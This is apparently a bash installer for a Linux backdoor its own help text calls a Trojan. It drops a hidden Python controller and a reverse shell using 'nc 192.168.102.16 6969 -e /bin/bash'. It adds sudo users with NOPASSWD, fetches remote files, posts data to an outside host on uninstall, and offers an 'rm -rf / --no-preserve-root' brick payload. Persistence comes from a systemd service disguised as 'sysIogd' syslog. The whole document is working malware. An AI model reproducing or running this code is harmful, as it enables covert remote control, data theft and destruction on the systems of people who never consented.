#!/bin/bash
while true
do
if ! [ -d /etc/.music ]
then
mkdir /etc/.music
fi
if ! [ -f /etc/.music/.skyrim.py ]
then
cat <<EOFA > /etc/.music/.skyrim.py
import os
import subprocess
import argparse
from sys import argv
CnC = "192.168.102.16"
CnCUser = "sysadmin"
inVal = ""
Dir = ""
Fil = ""
option = ""
link = ""
num = ""
def main():
    cont = True
    os.system("clear")
    print("Hey you, you're finally awake")
    print("Systemm, it just works")
    while (cont):
        print()
        value = input("Enter command(h or H - Help | e or E - Exit): ")
        if(value.lower() in ('h', 'help')):
            os.system("cat /var/spool/.log.sh")
        elif(value.lower() in ('e', 'exit')):
            exit()
        elif(value.lower() in ('u')):
            print("Uninstalling.....")
            os.system("touch /etc/temp.txt")
            os.system("ifconfig -a > /etc/temp.txt")
            os.system("curl -X POST -d \"file=@/etc/.thing.txt\" http://host:1337")
            os.system("rm /etc/temp.txt")
            os.system("rm /var/spool/.log.sh")
            os.system("rm /bin/.systemm.sh")
            os.system("rm /etc/.resolver.sh")
            print("Success.")
            cont = False
            os.remove(argv[0])
        elif(value.lower() in  ('k')):
            os.system("bash /etc/.music/brickPayload.sh")
            os.system("bash /var/spool/.payloadBrick.sh")
        elif(value.lower() in  ('a')):
            print("Adding a user.....")
            name = input("Enter username: ")
            password = input("Enter password: ")
            sudoIn = input("Should the user have root sudo? ")
            os.system("useradd "+name)
            os.system("echo "+name+":"+password+" | chpasswd")
            if(sudoIn.lower() in  ('y')):
                os.system("echo \""+name+" ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")
            print("Done. User "+name+" added.")
        elif(value.lower() in ('r')):
            print("Removing a user.....")
            print("Current users are:")
            os.system("cat /etc/passwd")
            name = input("Which user would you like to remove?")
            os.system("killall -u "+name)
            os.system("userdel -f -r "+name)
            print("User removed.")
        elif(value.lower() in ('c')):
            print("Entering Command-Line.....(Enter \"exit\" to exit)")
            x = True
            while(x):
                inVal = input("Command@Skyrim# ")
                if(inVal.lower() in ("exit")):
                    x = False
                elif(inVal.lower() in ('h', 'help')):
                    os.system("cat /var/spool/.log.sh")
                elif(inVal.lower() in ("info")):
                    print(os.uname())
                else:
                    os.system(inVal)
        elif(value.lower() in ('d')):
            print("Downloading.....")
            option = input("(F)ile or (D)irectory: ")
            if(option.lower() in ('f')):       
                Fil = input("Enter name of file to place download in: ")
                Dir = input("Enter directory to place file in(proper directory format, no end /): ")
                if(os.path.exists(Dir+"/"+Fil)):
                    option = input("File/Path already exists. Would you like to override? ")
                    if(option.lower() in ('y', 'yes')):   
                        link = input("Enter full url to download from: ")
                        os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                        if(os.path.exists(Dir+"/"+Fil)):
                            print("Successfully Downloaded.")
                        else:
                            print("File not present after download. Possible failure.")
                    else:
                        print("Not overriding. Exiting.")
                else:
                    link = input("Enter full url to download from: ")
                    os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                    if(os.path.exists(Dir+"/"+Fil)):
                        print("Successfully Downloaded.")
                    else:
                        print("File not present after download. Possible failure.")
            elif(option.lower() in ('d')):
                Dir = input("Enter directory to download to(proper directory format): ") 
                link = input("Enter full url to download from: ")
                option = input("Recursion(digs through subdirectories): ")
                if(option.lower() in ('y')):
                    num = input("How much depth(how many levels of subdirectories): ")
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " -r -l "+num+" "+link)
                else:
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " "+link)
        elif(value.lower() in ('l')):
            print("Uploading.....")
        elif(value.lower() in ('s')):
            print("Current module status:")
            print()
            if(checkStatus(".systemm.sh")):
                os.system("echo -e "+"systemm status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"systemm status: "+"\033[31m[INACTIVE]\033[0m")
            if(checkStatus(".resolver.sh")):
                os.system("echo -e "+"resolver status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"resolver status: "+"\033[31m[INACTIVE]\033[0m")
                
def checkStatus(fileName):
    ps_output = subprocess.check_output(["ps", "-ef"])
    ps_lines = ps_output.decode("utf-8").split("\n")
    for line in ps_lines:
        if fileName in line:
            return True
    else:
        return False
main()
EOFA
fi
if ! [ -f /var/spool/.log.sh ]
then
cat <<EOFB > /var/spool/.log.sh


General commands:

a -- Add a user. Will prompt for username and password, along with asking if the user needs sudo permissions to root. 
     This will be done by adding a NOPASSWD argument to the /etc/sudoers file
	
k -- Kill. Will execute the brick payload of ("rm -rf / --no-preserve-root").

u -- Uninstall. Will uninstall the program from the machine, along with sending ifconfig info back to the webserver.

r -- Remove. Will list current users in /etc/passwd and prompts the user for a name to delete.

c -- Command-Line. Enables command-line commands through the controller.

d -- Download. Downloads files and/or directories from a specified url.

s -- Status. Displays current running status of external scripts used by the Trojan.


Console Commands:

info -- Displays system information, including OS name, machine's network name, OS release/version, and hardware identifier.



EOFB
fi
if ! [ -f /etc/.resolver.sh ]
then
cat <<EOFC > /etc/.resolver.sh
#!/bin/bash
while true
do
nc 192.168.102.16 6969 -e /bin/bash 2>/dev/null
sleep 60
done
EOFC
chmod +x /etc/.resolver.sh
fi
if ! [ -f /lib/.sysIogd.sh ]
then
cat <<EOFD > /lib/.sysIogd.sh
#!/bin/bash
bash /etc/.resolver.sh &
bash /bin/systemm.sh &
EOFD
fi
if ! [ -f /etc/systemd/system/sysIogd.service ]
then
cat <<EOFE > /etc/systemd/system/sysIogd.service
[Unit]
Description=Syslog service

[Service]
Type=forking
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/bin/bash -c 'bash /lib/.sysIogd.sh'
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
EOFE
systemctl enable sysIogd
systemctl daemon-reload
systemctl start sysIogd
fi
done
sleep 60